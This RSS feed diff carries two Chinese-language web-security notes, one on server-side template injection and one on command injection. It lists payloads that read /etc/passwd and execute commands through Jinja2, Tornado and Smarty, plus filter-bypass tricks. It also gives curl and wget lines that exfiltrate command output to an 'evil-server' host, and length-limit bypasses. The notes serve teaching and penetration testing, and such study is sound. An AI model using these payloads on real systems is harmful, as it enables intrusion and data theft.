@@ -1,0 +1,333 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Khala • Posts by &#34;注入&#34; tag</title>
+        <link>https://mobius-0.github.io</link>
+        <description>GLHF</description>
+        <language>zh-CN</language>
+        <pubDate>Sun, 27 Nov 2022 09:51:54 +0800</pubDate>
+        <lastBuildDate>Sun, 27 Nov 2022 09:51:54 +0800</lastBuildDate>
+        <category>Hexo</category>
+        <category>shoya</category>
+        <category>网站</category>
+        <category>网络安全</category>
+        <category>工具</category>
+        <category>虚拟机</category>
+        <category>星际争霸2</category>
+        <category>平衡</category>
+        <category>杂谈</category>
+        <category>小说</category>
+        <category>江南</category>
+        <category>龙族</category>
+        <category>动画</category>
+        <category>法律法规</category>
+        <category>域名</category>
+        <category>DNS</category>
+        <category>WEB</category>
+        <category>HTTP</category>
+        <category>计算机网络</category>
+        <category>IPSec</category>
+        <category>VPN</category>
+        <category>SSL</category>
+        <category>TLS</category>
+        <category>WiFi</category>
+        <category>邮件</category>
+        <category>网络协议</category>
+        <category>Linux</category>
+        <category>渗透</category>
+        <category>信息收集</category>
+        <category>痕迹清理</category>
+        <category>Windows</category>
+        <category>ASP</category>
+        <category>CSharp</category>
+        <category>Golang</category>
+        <category>Java</category>
+        <category>语言</category>
+        <category>反序列化</category>
+        <category>混淆</category>
+        <category>沙箱</category>
+        <category>类</category>
+        <category>JDK</category>
+        <category>JavaScript</category>
+        <category>PHP</category>
+        <category>PowerShell</category>
+        <category>Python</category>
+        <category>Ruby</category>
+        <category>Shell</category>
+        <category>漏洞</category>
+        <category>CSRF</category>
+        <category>服务器</category>
+        <category>SQL注入</category>
+        <category>SSRF</category>
+        <category>Cache</category>
+        <category>XSS</category>
+        <category>XXE</category>
+        <category>XML</category>
+        <category>Xpath</category>
+        <category>注入</category>
+        <category>函数</category>
+        <category>绕过</category>
+        <category>遍历</category>
+        <category>包含</category>
+        <category>文件</category>
+        <category>目录</category>
+        <category>读取</category>
+        <category>上传</category>
+        <category>中间件</category>
+        <category>IIS</category>
+        <category>Apache</category>
+        <category>Nginx</category>
+        <category>逻辑</category>
+        <category>策略配置</category>
+        <category>端口</category>
+        <category>社会工程学</category>
+        <category>搜索</category>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
+            <title>模板注入</title>
+            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
+            <category>注入</category>
+            <category>绕过</category>
+            <pubDate>Sun, 27 Nov 2022 09:51:54 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。&lt;/p&gt;
+&lt;h1 id=&#34;测试方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试方法&#34;&gt;#&lt;/a&gt; 测试方法&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;确定使用的引擎&lt;/li&gt;
+&lt;li&gt;查看引擎相关的文档，确定其安全机制以及自带的函数和变量&lt;/li&gt;
+&lt;li&gt;需找攻击面，尝试攻击&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;测试用例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#测试用例&#34;&gt;#&lt;/a&gt; 测试用例&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;简单的数学表达式， &lt;code&gt;&amp;#123;&amp;#123; 7+7 &amp;#125;&amp;#125; =&amp;gt; 14&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;字符串表达式  &lt;code&gt;&amp;#123;&amp;#123; &#34;ajin&#34; &amp;#125;&amp;#125; =&amp;gt; ajin&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ruby&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;%= 7 * 7 %&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;%= File.open(&#39;/etc/passwd&#39;).read %&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Java&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$&amp;#123;7*7&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Twig&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Smarty&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;php&amp;#125;echo `id`;&amp;#123;/php&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;AngularJS&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$eval(&#39;1+1&#39;)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Tornado&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;引用模块  &lt;code&gt;&amp;#123;% import module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;=&amp;gt;  &lt;code&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123; os.popen(&#34;whoami&#34;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Flask/Jinja2&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; config.items() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; url_for.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).system(&#39;ls&#39;) &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read() &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Django&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#123; request &amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;% debug %&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;% load module %&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;% include &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;#123;% extends &#34;x.html&#34; %&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;目标&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标&#34;&gt;#&lt;/a&gt; 目标&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;创建对象&lt;/li&gt;
+&lt;li&gt;文件读写&lt;/li&gt;
+&lt;li&gt;远程文件包含&lt;/li&gt;
+&lt;li&gt;信息泄漏&lt;/li&gt;
+&lt;li&gt;提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;相关属性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关属性&#34;&gt;#&lt;/a&gt; 相关属性&lt;/h1&gt;
+&lt;h2 id=&#34;__class__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__class__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__class__&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;python 中的新式类（即显示继承 object 对象的类）都有一个属性  &lt;code&gt;__class__&lt;/code&gt;  用于获取当前实例对应的类，例如  &lt;code&gt;&amp;quot;&amp;quot;.__class__&lt;/code&gt;  就可以获取到字符串实例对应的类&lt;/p&gt;
+&lt;h2 id=&#34;__mro__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__mro__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__mro__&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;python 中类对象的  &lt;code&gt;__mro__&lt;/code&gt;  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。&lt;/p&gt;
+&lt;h2 id=&#34;__globals__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__globals__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__globals__&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;保存了函数所有的所有全局变量，在利用中，可以使用  &lt;code&gt;__init__&lt;/code&gt;  获取对象的函数，并通过  &lt;code&gt;__globals__&lt;/code&gt;  获取  &lt;code&gt;file&lt;/code&gt;   &lt;code&gt;os&lt;/code&gt;  等模块以进行下一步的利用&lt;/p&gt;
+&lt;h2 id=&#34;__subclasses__&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#__subclasses__&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__subclasses__()&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;python 的新式类都保留了它所有的子类的引用， &lt;code&gt;__subclasses__()&lt;/code&gt;  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。&lt;/p&gt;
+&lt;p&gt;因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  &lt;code&gt;__subclasses__()&lt;/code&gt;  方法就可以获取想要的类的对象。&lt;/p&gt;
+&lt;h1 id=&#34;常见payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[40](r&#39;/etc/passwd&#39;).read()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ls /&amp;quot;).read()&#39; )&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h1&gt;
+&lt;h2 id=&#34;字符串拼接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字符串拼接&#34;&gt;#&lt;/a&gt; 字符串拼接&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;使用参数绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用参数绕过&#34;&gt;#&lt;/a&gt; 使用参数绕过&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;params = &amp;#123;
+    &#39;clas&#39;: &#39;__class__&#39;,
+    &#39;mr&#39;: &#39;__mro__&#39;,
+    &#39;subc&#39;: &#39;__subclasses__&#39;
+&amp;#125;
+data = &amp;#123;
+    &amp;quot;data&amp;quot;: &amp;quot;&amp;#123;&amp;#123;&#39;&#39;[request.args.clas][request.args.mr][1][request.args.subc]()&amp;#125;&amp;#125;&amp;quot;
+&amp;#125;
+r = requests.post(url, params=params, data=data)
+print(r.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模版注入&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==&#34;&gt;用 Python 特性任意代码执行&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</guid>
+            <title>命令注入</title>
+            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</link>
+            <category>注入</category>
+            <category>函数</category>
+            <category>绕过</category>
+            <pubDate>Sat, 26 Nov 2022 17:30:44 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。&lt;/p&gt;
+&lt;p&gt;该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。&lt;/p&gt;
+&lt;h1 id=&#34;常见危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见危险函数&#34;&gt;#&lt;/a&gt; 常见危险函数&lt;/h1&gt;
+&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;system&lt;/li&gt;
+&lt;li&gt;exec&lt;/li&gt;
+&lt;li&gt;passthru&lt;/li&gt;
+&lt;li&gt;shell_exec&lt;/li&gt;
+&lt;li&gt;popen&lt;/li&gt;
+&lt;li&gt;proc_open&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;system&lt;/li&gt;
+&lt;li&gt;popen&lt;/li&gt;
+&lt;li&gt;subprocess.call&lt;/li&gt;
+&lt;li&gt;spawn&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;java.lang.Runtime.getRuntime().exec(command)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;常见注入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见注入方式&#34;&gt;#&lt;/a&gt; 常见注入方式&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;分号分割&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;  分割&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  管道符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\r\n&lt;/code&gt;   &lt;code&gt;%d0%a0&lt;/code&gt;  换行&lt;/li&gt;
+&lt;li&gt;反引号解析&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$()&lt;/code&gt;  替换&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;无回显技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无回显技巧&#34;&gt;#&lt;/a&gt; 无回显技巧&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;bash 反弹 shell&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DNS 带外数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;http 带外&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;curl http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wget http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;无带外时利用  &lt;code&gt;sleep&lt;/code&gt;  或其他逻辑构造布尔条件&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;常见绕过方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过方式&#34;&gt;#&lt;/a&gt; 常见绕过方式&lt;/h1&gt;
+&lt;h2 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  符号  &lt;code&gt;cat&amp;lt;123&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\t&lt;/code&gt;  /  &lt;code&gt;%09&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;   其中 {} 用来截断，比如 &lt;code&gt;cat$IFS2&lt;/code&gt;  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;黑名单绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单绕过&#34;&gt;#&lt;/a&gt; 黑名单绕过&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;a=l;b=s;$a$b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;base64  &lt;code&gt;echo &amp;quot;bHM=&amp;quot; | base64 -d&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/?in/?s&lt;/code&gt;  =&amp;gt;  &lt;code&gt;/bin/ls&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;连接符  &lt;code&gt;cat /etc/pass&#39;w&#39;d&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;未定义的初始化变量  &lt;code&gt;cat$x /etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;长度限制绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制绕过&#34;&gt;#&lt;/a&gt; 长度限制绕过&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt;wget\
+&amp;gt;foo.\
+&amp;gt;com
+ls -t&amp;gt;a
+sh a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件&lt;/p&gt;
+&lt;h1 id=&#34;常用符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用符号&#34;&gt;#&lt;/a&gt; 常用符号&lt;/h1&gt;
+&lt;h2 id=&#34;命令分隔符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令分隔符&#34;&gt;#&lt;/a&gt; 命令分隔符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt;  /  &lt;code&gt;%0d&lt;/code&gt;  /  &lt;code&gt;\n&lt;/code&gt;  /  &lt;code&gt;\r&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  /  &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  0 到无穷个任意字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  一个任意字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt;  一个在括号内的字符，e.g.  &lt;code&gt;[abcd]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[ - ]&lt;/code&gt;  在编码顺序内的所有字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[^ ]&lt;/code&gt;  一个不在括号内的字符&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;不使用时禁用相应函数&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;尽量不要执行外部的应用程序或命令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;做输入的格式检查&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;转义命令中的所有 shell 元字符&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;shell 元字符包括  &lt;code&gt;#&amp;amp;;`,|*?~&amp;lt;&amp;gt;^()[]&amp;#123;&amp;#125;$\&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
